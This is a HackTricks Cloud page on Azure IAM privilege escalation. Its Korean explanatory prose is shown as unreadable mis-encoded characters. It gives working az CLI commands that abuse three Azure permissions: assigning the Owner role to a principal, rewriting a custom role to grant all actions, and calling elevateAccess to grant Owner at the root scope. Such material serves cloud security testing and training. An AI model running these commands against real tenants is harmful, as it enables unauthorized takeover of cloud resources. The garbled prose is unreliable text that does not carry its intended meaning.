# Az - Azure IAM Privesc (Authorization)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Azure IAM

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../az-services/az-azuread.md" %}
[az-azuread.md](../az-services/az-azuread.md)
{% endcontent-ref %}

### Microsoft.Authorization/roleAssignments/write

ì´ ê¶Œí•œì€ íŠ¹ì • ë²”ìœ„ì— ëŒ€í•´ ì£¼ì²´ì—ê²Œ ì—­í• ì„ í• ë‹¹í•  ìˆ˜ ìˆê²Œ í•˜ë©°, ê³µê²©ìê°€ ìì‹ ì—ê²Œ ë” ë†’ì€ ê¶Œí•œì˜ ì—­í• ì„ í• ë‹¹í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Example
az role assignment create --role Owner --assignee "24efe8cf-c59e-45c2-a5c7-c7e552a07170" --scope "/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.KeyVault/vaults/testing-1231234"
```
{% endcode %}

### Microsoft.Authorization/roleDefinitions/Write

ì´ ê¶Œí•œì€ ì—­í• ì— ì˜í•´ ë¶€ì—¬ëœ ê¶Œí•œì„ ìˆ˜ì •í•  ìˆ˜ ìˆê²Œ í•˜ì—¬, ê³µê²©ìê°€ ìì‹ ì´ í• ë‹¹í•œ ì—­í• ì— ë” ë§ì€ ê¶Œí•œì„ ë¶€ì—¬í•¨ìœ¼ë¡œì¨ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

ë‹¤ìŒ **ë‚´ìš©**ìœ¼ë¡œ `role.json` íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤:
```json
{
"Name": "<name of the role>",
"IsCustom": true,
"Description": "Custom role with elevated privileges",
"Actions": [
"*"
],
"NotActions": [],
"DataActions": [
"*"
],
"NotDataActions": [],
"AssignableScopes": [
"/subscriptions/<subscription-id>"
]
}
```
ê·¸ëŸ° ë‹¤ìŒ ì´ì „ ì •ì˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì—­í•  ê¶Œí•œì„ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤:
```bash
az role definition update --role-definition role.json
```
### Microsoft.Authorization/elevateAccess/action

ì´ ê¶Œí•œì€ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ê³  Azure ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ê¶Œí•œì„ ëª¨ë“  ì£¼ì²´ì—ê²Œ í• ë‹¹í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŠ” Entra ID Global Administratorsì—ê²Œ ë¶€ì—¬ë˜ì–´ Azure ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ê¶Œí•œì„ ê´€ë¦¬í•  ìˆ˜ ìˆë„ë¡ í•˜ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤.

{% hint style="success" %}
ì‚¬ìš©ìê°€ elevate í˜¸ì¶œì´ ì‘ë™í•˜ê¸° ìœ„í•´ì„œëŠ” Entra IDì˜ Global Administratorì—¬ì•¼ í•œë‹¤ê³  ìƒê°í•©ë‹ˆë‹¤.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Call elevate
az rest --method POST --uri "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# Grant a user the Owner role
az role assignment create --assignee "<obeject-id>" --role "Owner" --scope "/"
```
{% endcode %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
